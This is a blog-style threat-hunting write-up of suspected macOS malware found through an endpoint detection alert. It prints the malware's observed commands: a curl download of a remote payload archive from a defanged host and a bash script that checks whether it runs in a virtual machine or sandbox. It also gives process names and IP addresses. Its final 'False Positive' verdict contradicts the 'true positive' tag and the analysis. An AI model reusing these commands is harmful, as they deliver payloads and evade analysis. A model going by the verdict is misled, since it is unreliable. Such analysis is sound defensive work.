---
title: Mac Malware?
date: 2022-05-19 11:39 +0200
categories: [Hunting, MDE]
tags: [mde, hunting, true positive]
---

Today we investigate some strange discovery actions by processes on a macbook

## The Alert
In the essence this alert was showing multiple different processes doing very similar actions, for sake of simplicity we will focus on one.
In most cases the process [xpcproxy](https://www.unix.com/man-page/osx/8/xpcproxy/) was used to run a sub process which in turn started some bash commands.
For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain (my mac knowledge is basic)
This xpcproxy would run an executable for example apadecoded and this in turn would run new processes example:
```bash
/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/FE8B53AE-FE86-4FF8-98E1-D7987304368D
```
apadecoded itself looks already strange enough and is also found on VT, but what is this "FE8B53AE-FE86-4FF8-98E1-D7987304368D"?

It seems like this executable toes a download of some additional code from external and extracts it to "/private/var/tmp/helpexecd/helpexecd"
```bash
/usr/bin/curl -s -L -o /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgz
tar -xzf /var/tmp/helpexecd.tgz -C /var/tmp/helpexecd/
```
And then it runs this helpexecd which amongst other things runs this bash script:
```bash
/bin/sh -c 'readonly VM_LIST="VirtualBox\|Oracle\|VMware\|Parallels\|qemu";is_hwmodel_vm(){ ! sysctl -n hw.model|grep "Mac">/dev/null;};is_ram_vm(){(($(($(sysctl -n hw.memsize)/ 1073741824))<4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo "${ped}"|grep -e "board-id" -e "product-name" -e "model"|grep -qi "${VM_LIST}"||echo "${ped}"|grep "manufacturer"|grep -v "Apple">/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e "Manufacturer" -e "Vendor Name"|grep -qi "${VM_LIST}";};is_hw_data_vm(){ system_profiler SPHardwareDataType 2>&1 /dev/null|grep -e "Model Identifier"|grep -qi "${VM_LIST}";};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&&echo 1||echo 0;};main "${@}"'
```
Now this feels like malware trying to figure out if it's running in a sandbox, highly fishy!

## Hunting deeper

If we look at more cases of the same endpoint we can see that the same thing that apadecoded does, what's more interesting is, that there are many processes starting the exact same behaviour.
Here is a list of observed ones:
 * canonistical
 * noble
 * odontolite
 * intrinsicalness
 * TestDate
 * SysUpdater
 * leam
 * recommitment
 * TestDateDaemon
 * apadecode
 * apadecoded

{% include mermaid_start.liquid %}
flowchart TD;
    kernel_task --> launchd;
    launchd --> xpcproxy;
    xpcproxy --> |run| apadecoded;
    apadecoded --> |run| 451CEB63-C438-40C3-899F-0BE4F425F074;
    apadecoded --> |run| DFBDC5FD-3F69-472A-832B-C8C394560BC4;
    apadecoded --> |run| AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09;
    451CEB63-C438-40C3-899F-0BE4F425F074 --> curl;
    DFBDC5FD-3F69-472A-832B-C8C394560BC4 --> curl;
    AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09 --> curl;
    curl --> cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz;
    cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --> 89.187.162.142;
    cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --> 89.187.162.134;
    89.187.162.142 --> |download| /private/var/tmp/helpexecd/helpexecd.tgz;
    89.187.162.134 --> |download| /private/var/tmp/helpexecd/helpexecd.tgz;
    /private/var/tmp/helpexecd/helpexecd.tgz --> |extract| helpexecd;
    helpexecd --> 35.160.226.50;
    helpexecd --> 34.217.226.241;
    style apadecoded stroke-dasharray: 88.5 44
    style helpexecd stroke-dasharray: 88.5 44
{% include mermaid_end.liquid %}


## Verdict

| Indicator                              | Thoughts                                                                                                            | Verdict |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------------|---------|
| CMD started by User                    | Either compromise of host, or legitimate action by user                                                             | -10%    |

**Verdict: False Positive**

## Next Steps

